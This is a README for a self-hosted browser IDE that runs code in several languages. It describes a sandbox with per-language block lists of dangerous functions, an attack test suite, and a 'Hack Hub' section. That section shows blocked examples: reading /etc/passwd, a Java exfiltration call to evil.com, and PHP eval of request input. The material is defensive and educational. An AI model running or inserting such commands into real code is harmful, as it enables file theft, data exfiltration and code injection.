<p align="center">
  <img src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/javascript/javascript.png" width="60" alt="JS"/>
  <img src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/typescript/typescript.png" width="60" alt="TS"/>
  <img src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/python/python.png" width="60" alt="Python"/>
  <img src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/java/java.png" width="60" alt="Java"/>
  <img src="https://raw.githubusercontent.com/github/explore/ccc16358ac4530c6a69b1b80c7223cd2744dea83/topics/php/php.png" width="60" alt="PHP"/>
  <img src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/csharp/csharp.png" width="60" alt="C#"/>
</p>

<h1 align="center">🚀 Browser Coder</h1>

<p align="center">
  <strong>A Production-Ready, Auto-Scaling Web IDE</strong><br>
  <em>Code in JavaScript, TypeScript, Python, Java, PHP &amp; C# — directly in your browser</em>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Capacity-10,000+_users-brightgreen?style=for-the-badge" alt="Capacity"/>
  <img src="https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker" alt="Docker"/>
  <img src="https://img.shields.io/badge/Auto--Scale-1--8_replicas-orange?style=for-the-badge" alt="Auto-Scale"/>
  <img src="https://img.shields.io/badge/Monaco-Editor-9c27b0?style=for-the-badge" alt="Monaco"/>
  <img src="https://img.shields.io/badge/Security-258+_Tests-red?style=for-the-badge&logo=shield" alt="Security"/>
</p>

<p align="center">
  <a href="http://167.71.63.99" target="_blank"><strong>🌐 Live Demo</strong></a> •
  <a href="http://167.71.63.99/reports/2026-01-07_security-report_2026-01-07_08-55-28-705Z.html" target="_blank"><strong>🛡️ Security Report</strong></a>
</p>

<p align="center">
  <a href="#-quick-start">Quick Start</a> •
  <a href="#-features">Features</a> •
  <a href="#-interface-guide">Interface</a> •
  <a href="#-architecture">Architecture</a> •
  <a href="#-security">Security</a> •
  <a href="#-hack-hub">Hack Hub</a> •
  <a href="#-api-reference">API</a> •
  <a href="#-deployment">Deployment</a>
</p>

---

## ⚡ Quick Start

```bash
# One command to rule them all
docker compose up -d
```

**That's it!** Access at **http://localhost**

<details>
<summary>📋 <strong>What happens behind the scenes?</strong></summary>

<br>

1. ✅ Builds optimized production images
2. ✅ Starts nginx load balancer on port 80
3. ✅ Launches auto-scaling API (1-8 instances)
4. ✅ Enables health monitoring & auto-recovery
5. ✅ Configures rate limiting & caching

</details>

---

## 🎯 Features

<table>
<tr>
<td width="50%">

### 🖥️ VS Code-Like Interface
- Monaco Editor with IntelliSense
- Multi-file tabs with persistence
- File explorer with folder support
- Dark/Light theme switching
- Resizable panels

</td>
<td width="50%">

### 🔍 Search & Replace
- Search across all files
- Regex & case-sensitive options
- Replace single or all matches
- Real-time results preview
- Navigate to any match

</td>
</tr>
<tr>
<td width="50%">

### ▶️ Smart Execution
- Run entire file or specific functions
- Auto-detect functions/classes
- Per-function run buttons
- Execution output panel
- 10-second timeout protection

</td>
<td width="50%">

### 💾 Persistent Storage
- IndexedDB-based file storage
- Auto-save on typing (1s debounce)
- Survives browser refresh
- Export project as ZIP
- Clear cache option

</td>
</tr>
<tr>
<td width="50%">

### 🚀 Production Ready
- Auto-scaling (1-8 replicas)
- Circuit breaker protection
- LRU cache with TTL
- Request deduplication
- Rate limiting (30/sec/IP)

</td>
<td width="50%">

### 🌐 Multi-Language
- JavaScript (ES5 → ES2022)
- TypeScript (TS5, strict mode)
- Python 3
- Java 11 & 17
- PHP 8

</td>
</tr>
</table>

---

## 🖼️ Interface Guide

### Main Layout

<p align="center">
  <img src="screenshots/Screenshot 2026-01-06 at 1.07.13.png" alt="Browser Coder Interface" width="900"/>
</p>



---

### 📁 Activity Bar (Left Edge)

| Icon | Panel | Function |
|:----:|-------|----------|
| 📁 | **Explorer** | File tree, create/delete/rename files & folders |
| 🔍 | **Search** | Search & replace across all files |
| ▶️ | **Run** | List of detected functions, run individually |
| ⚙️ | **Settings** | (Future: workspace settings) |

---

### 🗂️ Explorer Panel

<table>
<tr>
<td>

**Toolbar Buttons:**

| Button | Action |
|--------|--------|
| � | Create new file |
| 📁 | Create new folder |
| 🔄 | Refresh file tree |

</td>
<td>

**File Actions (Right-click):**

| Action | Description |
|--------|-------------|
| 📄 New File | Create in selected folder |
| 📁 New Folder | Create subfolder |
| ✏️ Rename | Double-click also works |
| 🗑️ Delete | With confirmation |

</td>
</tr>
</table>

> 💡 **Note:** Download Project and Clear Cache buttons are in the **Title Bar** for easy access.

---

### 🔍 Search Panel

<details>
<summary><strong>Click to expand search panel diagram</strong></summary>

```
┌─────────────────────────────────┐
│ [Search input...        ] [.*][Aa][ab] │  ← Regex, Case, Whole Word
│ [Replace input...       ] [⟳]         │  ← Replace All button
├─────────────────────────────────┤
│ 5 results in 2 files  [Replace All]   │
├─────────────────────────────────┤
│ 🟨 main.js (3)                  │
│   12: const hello = ...         │
│   45: function hello() {        │
│   78: export { hello };         │
│ 🐍 utils.py (2)                 │
│   5: def hello():               │
│   23: hello()                   │
└─────────────────────────────────┘
```

</details>

**Search Features:**
- 🔤 **Plain text search** — Simple string matching
- 🔠 **Case sensitive** — Match exact casing
- 📝 **Whole word** — Match complete words only
- 🎯 **Regex** — Full regular expression support

---

### ▶️ Run Panel

<details>
<summary><strong>Click to expand run panel diagram</strong></summary>

```
┌─────────────────────────────────────────┐
│ ▶ RUN ALL                               │
│   ▶ Run Entire File   Ctrl+Enter        │
├─────────────────────────────────────────┤
│ 𝑓 FUNCTIONS                             │
│   𝑓 greet(...)                      ▶   │  ← Has parameters
│   Args: ["Alice"______________] ↵       │  ← Enter arguments here!
│                                         │
│   𝑓 calculate(...)                  ▶   │
│   Args: [5, 10________________] ↵       │  ← Comma-separated values
│                                         │
│   𝐶 Calculator                      ▶   │  ← Classes show constructor args
│   Args: [100_________________] ↵        │
│                                         │
│   → noArgs()                        ▶   │  ← No args input shown
└─────────────────────────────────────────┘
```

</details>

**Run Features:**
- ▶️ **Run Entire File** — Execute the full code
- 🎯 **Run Function** — Execute only a specific function
- 📝 **Function Arguments** — Enter arguments before running (for functions with parameters)
- 🏗️ **Class Instantiation** — Pass constructor arguments when running classes
- 🔍 **Auto-detect** — Functions, classes & arrow functions
- ⏱️ **Timeout** — 10-second execution limit

> 💡 **Tip:** Type arguments exactly as you would in code: `"hello", 42, true`

---

## ⌨️ Keyboard Shortcuts

<table>
<tr><th>Shortcut</th><th>Action</th><th>Shortcut</th><th>Action</th></tr>
<tr><td><kbd>Ctrl</kbd>+<kbd>Enter</kbd></td><td>Run code</td><td><kbd>Ctrl</kbd>+<kbd>S</kbd></td><td>Save file</td></tr>
<tr><td><kbd>Ctrl</kbd>+<kbd>N</kbd></td><td>New file</td><td><kbd>Ctrl</kbd>+<kbd>W</kbd></td><td>Close tab</td></tr>
<tr><td><kbd>Ctrl</kbd>+<kbd>B</kbd></td><td>Toggle sidebar</td><td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>F</kbd></td><td>Open search</td></tr>
<tr><td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>E</kbd></td><td>Open explorer</td><td><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>P</kbd></td><td>Command palette</td></tr>
</table>

---

## 🏗️ Architecture

```
                        ┌────────────────────────────────────────────┐
                        │              NGINX                          │
       Users ──────────▶│    Load Balancer + Static CDN              │
                        │         Port 80                             │
                        └──────────────────┬─────────────────────────┘
                                           │
               ┌───────────────────────────┼───────────────────────────┐
               │                           │                           │
               ▼                           ▼                           ▼
      ┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
      │     API #1      │         │     API #2      │         │     API #N      │
      │  ┌───────────┐  │         │  ┌───────────┐  │         │  ┌───────────┐  │
      │  │ LRU Cache │  │         │  │ LRU Cache │  │         │  │ LRU Cache │  │
      │  └───────────┘  │         │  └───────────┘  │         │  └───────────┘  │
      │  ┌───────────┐  │         │  ┌───────────┐  │         │  ┌───────────┐  │
      │  │ Circuit   │  │         │  │ Circuit   │  │         │  │ Circuit   │  │
      │  │ Breaker   │  │         │  │ Breaker   │  │         │  │ Breaker   │  │
      │  └───────────┘  │         │  └───────────┘  │         │  └───────────┘  │
      │  ┌───────────┐  │         │  ┌───────────┐  │         │  ┌───────────┐  │
      │  │ Process   │  │         │  │ Process   │  │         │  │ Process   │  │
      │  │ Pool      │  │         │  │ Pool      │  │         │  │ Pool      │  │
      │  └───────────┘  │         │  └───────────┘  │         │  └───────────┘  │
      └─────────────────┘         └─────────────────┘         └─────────────────┘
               │                           │                           │
               └───────────────────────────┼───────────────────────────┘
                                           │
                        ┌──────────────────▼─────────────────────────┐
                        │           AUTOSCALER                       │
                        │  Monitors CPU, Memory, Queue               │
                        │  Scales 1-8 replicas dynamically           │
                        └────────────────────────────────────────────┘
```

---

### Smart Server Components

<details>
<summary><strong>🗄️ LRU Cache with TTL</strong></summary>

- **Capacity:** 100 entries per API instance
- **TTL:** 30 minutes
- **Key:** Hash of code + language + version
- **Benefit:** Identical executions return instantly

```javascript
// Cache hit example
{
  "stdout": "Hello, World!",
  "cached": true,        // ← Cache hit!
  "durationMs": 0        // ← Instant response
}
```

</details>

<details>
<summary><strong>⚡ Circuit Breaker</strong></summary>

- **Threshold:** Opens after 5 consecutive failures
- **Cooldown:** 30 seconds before retry
- **State:** CLOSED → OPEN → HALF-OPEN → CLOSED
- **Benefit:** Prevents cascade failures

```
CLOSED (normal)  → 5 failures → OPEN (failing fast)
                                     ↓ 30s
                              HALF-OPEN (testing)
                                     ↓ success
                              CLOSED (recovered)
```

</details>

<details>
<summary><strong>🔄 Request Deduplication</strong></summary>

- **Scope:** Concurrent identical requests
- **Behavior:** Only first request executes; others wait & share result
- **Benefit:** Reduces server load under duplicate traffic

```
Request A: code="print(1)" → Execute → Result
Request B: code="print(1)" → Wait    → Same Result
Request C: code="print(1)" → Wait    → Same Result
```

</details>

<details>
<summary><strong>👷 Process Pool</strong></summary>

- **Pool size:** 3 warm processes per language
- **Reuse:** Processes are recycled, not recreated
- **Startup:** Pre-warmed on first request
- **Benefit:** Eliminates cold-start latency

</details>

---

### Auto-Scaling Logic

| Metric | Scale UP | Scale DOWN |
|--------|----------|------------|
| **CPU Usage** | > 70% | < 30% |
| **Queue Size** | > 50 requests | < 5 requests |
| **Cooldown** | 30 seconds | 30 seconds |
| **Range** | 1 → 8 replicas | 8 → 1 replicas |

<details>
<summary><strong>📊 View scaling logs</strong></summary>

```bash
docker logs -f browser_coder-autoscaler-1
```

**Example output:**
```
[2026-01-05 21:24:39] 🚀 Auto-Scaler started
[2026-01-05 21:24:39] 📊 Config: MIN=1, MAX=8, CPU↑=70%, CPU↓=30%
[2026-01-05 21:24:57] 📈 Replicas: 2, CPU: 45.2%, Memory: 32.1%, Queue: 12
[2026-01-05 21:25:10] 📈 Replicas: 2, CPU: 78.5%, Memory: 41.3%, Queue: 67
[2026-01-05 21:25:10] ⬆️ Scale UP triggered (CPU: 78.5% > 70% or Queue: 67 > 50)
[2026-01-05 21:25:10] 🔄 Scaling browser_coder-api: 2 → 3 replicas
[2026-01-05 21:25:12] ✅ Started new API container
```

</details>

---

## 🔒 Security

Browser Coder implements **defense-in-depth** security to prevent malicious code from accessing the server, filesystem, network, or executing system commands.

### Security Layers

| Layer | Protection |
|-------|------------|
| **1. Code Validation** | Pattern-based blocking of dangerous functions before execution |
| **2. Runtime Sandboxing** | Language-specific security flags and restrictions |
| **3. Process Isolation** | Sanitized environment variables, restricted PATH |
| **4. Container Security** | Docker security options, capability dropping, read-only mounts |
| **5. Resource Limits** | Memory caps, execution timeouts, output truncation |

---

### 🛡️ Blocked Patterns by Language

<details>
<summary><strong>JavaScript / TypeScript</strong></summary>

| Category | Blocked |
|----------|---------|
| **Process Execution** | `child_process`, `spawn`, `exec`, `execSync`, `fork` |
| **File System** | `fs`, `fs/promises`, `node:fs` |
| **Network** | `net`, `http`, `https`, `dgram`, `fetch`, `WebSocket` |
| **Process Access** | `process.exit`, `process.env`, `process.cwd` |
| **Code Injection** | `eval()`, `Function()`, dynamic `require()`/`import()` |
| **System** | `os`, `cluster`, `vm`, `worker_threads` |

**Runtime Restrictions:**
```bash
node --experimental-permission --allow-fs-read=/sandbox --max-old-space-size=128
```

</details>

<details>
<summary><strong>Python</strong></summary>

| Category | Blocked |
|----------|---------|
| **Command Execution** | `os.system`, `os.popen`, `subprocess`, `commands` |
| **Dangerous Imports** | `os`, `sys`, `subprocess`, `socket`, `http`, `urllib`, `requests`, `shutil`, `pty`, `ctypes` |
| **File Operations** | `open()` in write mode, `os.remove`, `os.mkdir`, `os.rmdir`, `os.walk` |
| **Code Injection** | `exec()`, `eval()`, `compile()`, `__import__()`, `importlib` |
| **Introspection** | `__builtins__`, `__class__`, `__subclasses__`, `__globals__`, `getattr`, `setattr` |
| **Serialization** | `pickle`, `cPickle`, `marshal` |

**Runtime Restrictions:**
```bash
python3 -u -I -S -c "code"  # Isolated mode, no site packages
```

</details>

<details>
<summary><strong>PHP</strong></summary>

| Category | Blocked |
|----------|---------|
| **Command Execution** | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, backticks |
| **File Operations** | `fopen`, `fwrite`, `file_put_contents`, `file_get_contents`, `include`, `require`, `unlink`, `mkdir` |
| **Code Injection** | `eval`, `assert`, `create_function`, `call_user_func` |
| **Network** | `fsockopen`, `curl_*`, `socket_*`, `stream_socket_*` |
| **System** | `phpinfo`, `putenv`, `getenv`, `ini_set`, `dl` |
| **Superglobals** | `$_SERVER`, `$_ENV`, `$_GET`, `$_POST`, `$GLOBALS` |

**Runtime Restrictions:**
```bash
php -d open_basedir=/sandbox -d disable_functions=exec,shell_exec,system,...
```

</details>

<details>
<summary><strong>Java</strong></summary>

| Category | Blocked |
|----------|---------|
| **Command Execution** | `Runtime.exec()`, `ProcessBuilder` |
| **File I/O** | `File`, `FileReader`, `FileWriter`, `FileInputStream`, `Files.*` |
| **Network** | `Socket`, `ServerSocket`, `URL`, `HttpURLConnection`, `HttpClient` |
| **Reflection** | `getDeclaredMethod`, `setAccessible`, `Class.forName`, `invoke` |
| **ClassLoader** | `ClassLoader`, `URLClassLoader`, `defineClass`, `loadClass` |
| **System** | `System.exit`, `System.getProperty`, `System.getenv`, `System.load` |
| **Scripting** | `ScriptEngine`, `ScriptEngineManager` |
| **Serialization** | `ObjectInputStream`, `readObject` |

**Runtime Restrictions:**
```bash
java -Xmx128m -Xms32m -XX:MaxMetaspaceSize=64m -Djava.security.manager=allow
```

</details>

---

### 🐳 Container Security

```yaml
# Docker security settings applied to API containers
security_opt:
  - no-new-privileges:true    # Prevent privilege escalation
tmpfs:
  - /tmp:size=100M           # In-memory temp, size limited
  - /app/sandbox:size=50M    # Isolated execution directory
cap_drop:
  - ALL                       # Drop all Linux capabilities
cap_add:
  - SETUID                    # Only add what's needed
  - SETGID
```

### 🌐 Network Isolation

- API containers run on an **internal-only network**
- No direct internet access from code execution
- Only nginx can reach API containers
- Rate limiting: 200 requests/minute per IP

### ⏱️ Resource Limits

| Resource | Limit |
|----------|-------|
| **Execution Timeout** | 10 seconds |
| **Memory (per container)** | 1 GB |
| **Memory (per execution)** | 128 MB |
| **Output Size** | 100 KB |
| **Code Size** | 100 KB |

---

## 🧪 Security Testing

Browser Coder includes a comprehensive **automated security test suite** with 258+ attack vectors to validate that all security measures are working correctly.

### Test Categories

| Category | Description | Tests |
|----------|-------------|-------|
| **Command Execution** | `exec`, `spawn`, `system`, `popen`, `Runtime.exec` | 30+ |
| **File System** | Read/write files, directory traversal, path manipulation | 35+ |
| **Network** | Sockets, HTTP requests, DNS lookups, reverse shells | 25+ |
| **Code Injection** | `eval`, `exec`, dynamic imports, reflection | 40+ |
| **Process Access** | Environment variables, process info, system properties | 20+ |
| **Deserialization** | Pickle, ObjectInputStream, YAML, JSON exploits | 15+ |
| **Privilege Escalation** | SecurityManager bypass, ClassLoader manipulation | 20+ |
| **Safe Code** | Legitimate code that SHOULD execute (no false positives) | 24 |

### Running Security Tests

```bash
# Run full security test suite
docker compose run --rm security-tests

# Output example:
# ✓ JS: child_process.exec (blocked)
# ✓ Python: os.system (blocked)  
# ✓ Java: Runtime.exec (blocked)
# ✓ PHP: shell_exec (blocked)
# ✓ JS: Safe console.log (executed) ✓
# ...
# ═══════════════════════════════════════
# ✓ Passed:  258 | ✗ Failed: 0 | Rate: 100%
```

### Security Reports

After each test run, detailed HTML reports are generated:

- **English Report**: `/reports/security-report-latest.html`
- **Hebrew Report**: `/reports/security-report-latest-he.html`

📊 **[View Live Security Report →](http://167.71.63.99/reports/2026-01-07_security-report_2026-01-07_08-55-28-705Z.html)**

<details>
<summary><strong>📋 Report Contents</strong></summary>

- ✅ Pass/Fail summary with percentages
- 📊 Breakdown by language (JS, TS, Python, PHP, Java)
- 📁 Breakdown by attack category
- ⏱️ Execution time per test
- 🔍 Full code and error details for each test
- 📈 Visual charts and statistics

</details>

---

## 🏴‍☠️ Hack Hub

Browser Coder includes a built-in **Hack Hub** — an educational security playground where users can learn about code injection, sandbox escapes, and security vulnerabilities.

### Accessing Hack Hub

Click the **"Hack Hub"** button in the IDE sidebar or visit `/hack-hub`.

### Educational Content

The Hack Hub provides:

| Section | Description |
|---------|-------------|
| **Attack Vectors** | Learn about common attack patterns for each language |
| **Why It's Blocked** | Understand the security implications of each attack |
| **Safe Alternatives** | See how to accomplish tasks safely |
| **Live Testing** | Try attacks yourself and see them get blocked |

### Example Attack Categories

<details>
<summary><strong>🔓 Command Injection</strong></summary>

```javascript
// ❌ Blocked - Command execution
const { exec } = require('child_process');
exec('cat /etc/passwd');

// ✅ Safe alternative - No system access needed
console.log('Process data in-memory instead');
```

**Why blocked?** Allows arbitrary system command execution, leading to full server compromise.

</details>

<details>
<summary><strong>📂 File System Access</strong></summary>

```python
# ❌ Blocked - File reading
with open('/etc/passwd', 'r') as f:
    print(f.read())

# ✅ Safe alternative - Work with provided data
data = "provided input"
print(data.upper())
```

**Why blocked?** Prevents reading sensitive system files and source code.

</details>

<details>
<summary><strong>🌐 Network Exfiltration</strong></summary>

```java
// ❌ Blocked - Outbound network
URL url = new URL("http://evil.com/steal?data=secret");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();

// ✅ Safe alternative - No network needed for computation
System.out.println("Compute locally: " + (2 + 2));
```

**Why blocked?** Prevents data exfiltration and command-and-control communication.

</details>

<details>
<summary><strong>🔄 Code Injection</strong></summary>

```php
// ❌ Blocked - Dynamic code execution
eval($_GET['code']);

// ✅ Safe alternative - Static, validated logic
$result = 2 + 2;
echo $result;
```

**Why blocked?** Dynamic code execution allows arbitrary code injection attacks.

</details>

### Security Philosophy

> 🎓 **"Learn attacks to build better defenses"**
>
> The Hack Hub is designed for educational purposes. Understanding how attacks work helps developers:
> - Write more secure code
> - Understand why security restrictions exist
> - Recognize vulnerable patterns in their own applications

---

## 💾 Data Storage

### File Persistence (IndexedDB)

<details>
<summary><strong>📂 Database Schema</strong></summary>

```javascript
// Database Structure
{
  name: 'BrowserCoderDB',
  version: 2,
  stores: {
    files: {
      keyPath: 'id',
      indexes: ['name', 'path', 'parentId', 'language', 'order']
    },
    folders: {
      keyPath: 'id', 
      indexes: ['name', 'path', 'parentId', 'order']
    },
    workspace: {
      keyPath: 'key'  // Stores: activeFileId, theme
    }
  }
}
```

</details>

<details>
<summary><strong>📄 File Object Structure</strong></summary>

```javascript
{
  id: 'file_1704480000000_abc123',
  name: 'main.js',
  path: '/src/main.js',
  parentId: 'folder_1704479000000_xyz789',
  language: 'javascript',
  version: 'es2022',
  content: '// Your code here...',
  isUserModified: true,
  createdAt: 1704480000000,
  updatedAt: 1704481000000,
  order: 0
}
```

</details>

**Storage Features:**
- 📁 **Hierarchical folders** — Unlimited nesting depth
- 💾 **Auto-save** — Saves 1 second after last keystroke
- 🔄 **Sync** — Survives browser refresh, tab close
- 📦 **Export** — Download entire project as ZIP
- 🗑️ **Clear** — One-click cache reset

---

## 🔌 API Reference

<details>
<summary><strong>GET /health</strong> — Health check endpoint</summary>

```bash
curl http://localhost/health
```

**Response:**
```json
{
  "status": "healthy",
  "active": 2,
  "load": "45.2%",
  "uptime": 3600,
  "cache": {
    "size": 42,
    "hits": 156,
    "misses": 23
  }
}
```

</details>

<details>
<summary><strong>GET /api/languages</strong> — List supported languages</summary>

```bash
curl http://localhost/api/languages
```

**Response:**
```json
[
  {
    "id": "javascript",
    "name": "JavaScript",
    "extension": "js",
    "monacoLanguage": "javascript",
    "icon": "🟨",
    "versions": [
      { "id": "es5", "name": "ES5", "default": false },
      { "id": "es2015", "name": "ES2015 (ES6)", "default": false },
      { "id": "es2020", "name": "ES2020", "default": false },
      { "id": "es2022", "name": "ES2022", "default": true }
    ]
  }
]
```

</details>

<details>
<summary><strong>POST /api/run</strong> — Execute code</summary>

```bash
curl -X POST http://localhost/api/run \
  -H "Content-Type: application/json" \
  -d '{
    "code": "print(\"Hello, World!\")",
    "language": "python",
    "version": "python3"
  }'
```

**Success Response:**
```json
{
  "stdout": "Hello, World!\n",
  "stderr": "",
  "exitCode": 0,
  "durationMs": 45,
  "cached": false
}
```

**Error Response (429 - Rate Limited):**
```json
{
  "error": "Rate limit exceeded",
  "retryAfter": 5
}
```

</details>

<details>
<summary><strong>GET /api/starter/:lang/:version</strong> — Get starter code</summary>

```bash
curl http://localhost/api/starter/python/python3
```

**Response:**
```python
# Python 3.x
# Starter template for Python development

def greet(name: str) -> str:
    """Return a greeting message."""
    return f"Hello, {name}!"

def main():
    print(greet("World"))
    
    # Try list comprehension
    squares = [x**2 for x in range(10)]
    print(f"Squares: {squares}")

if __name__ == "__main__":
    main()
```

</details>

---

## 🚀 Deployment

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `MAX_SCALE` | `8` | Maximum API replicas |
| `MIN_REPLICAS` | `1` | Minimum API replicas |
| `INITIAL_REPLICAS` | `2` | Starting replicas |
| `RUN_TIMEOUT_MS` | `10000` | Execution timeout (ms) |
| `RATE_LIMIT_MAX` | `200` | Requests/min per IP |

### Scaling Examples

```bash
# High traffic setup (16 max replicas)
MAX_SCALE=16 INITIAL_REPLICAS=4 docker compose up -d

# Low resource mode (2 max replicas)
MAX_SCALE=2 MIN_REPLICAS=1 INITIAL_REPLICAS=1 docker compose up -d

# Check scaling logs
docker logs -f browser_coder-autoscaler-1
```

### Resource Recommendations

| Concurrent Users | Server Specs | Replicas |
|------------------|--------------|----------|
| Up to 1,000 | 2 vCPU, 4GB RAM | 1-2 |
| Up to 5,000 | 4 vCPU, 8GB RAM | 2-4 |
| Up to 10,000 | 8 vCPU, 16GB RAM | 4-8 |
| 10,000+ | 16 vCPU, 32GB RAM | 8-16 |

---

## 🐳 Docker Commands

```bash
# Start everything
docker compose up -d

# View logs (all services)
docker compose logs -f

# View specific service logs
docker compose logs -f api
docker compose logs -f autoscaler

# Check running containers
docker compose ps

# Stop everything
docker compose down

# Full rebuild
docker compose down -v
docker compose build --no-cache
docker compose up -d

# Scale manually (for testing)
docker compose up -d --scale api=4
```

---

## 🛠️ Development

### Local Development

```bash
# Install dependencies
npm install

# Start Vite dev server (hot reload)
npm run dev

# Build for production
npm run build
```

### Project Structure

```
browser-coder/
├── 📄 docker-compose.yml     # One-command deployment
├── 📄 Dockerfile.production  # Optimized multi-stage build
├── 📄 Dockerfile.autoscaler  # Auto-scaling service
├── 📄 autoscaler.sh          # Scaling logic (bash)
├── 📄 server.mjs             # Smart API server (Node.js)
├── 📄 index.html             # SPA entry point
├── 📁 nginx/
│   └── nginx.conf            # Load balancer + CDN config
├── 📁 src/
│   ├── main.ts               # Frontend application
│   ├── storage.ts            # IndexedDB manager
│   ├── tabs.ts               # Tab management
│   └── languages/
│       ├── index.ts          # Language exports
│       ├── loader.ts         # Dynamic loader
│       └── types.ts          # TypeScript types
└── 📁 languages/             # Language configurations
    ├── javascript/
    ├── typescript/
    ├── python/
    ├── java/
    └── php/
```

---

## 🔒 Security

- ✅ Non-root container execution
- ✅ Input sanitization
- ✅ 10-second execution timeout
- ✅ Rate limiting (30 req/sec/IP)
- ✅ Resource limits per container
- ✅ No persistent server-side storage

---

## 📜 License

MIT License — Use freely in personal and commercial projects.

---

<p align="center">
  <strong>Built with ❤️ for developers who want to code anywhere.</strong>
</p>

<p align="center">
  <a href="https://github.com/ninasokolov8/browser-coder">⭐ Star on GitHub</a> •
  <a href="https://github.com/ninasokolov8/browser-coder/issues">🐛 Report Bug</a> •
  <a href="https://github.com/ninasokolov8/browser-coder/issues">✨ Request Feature</a>
</p>
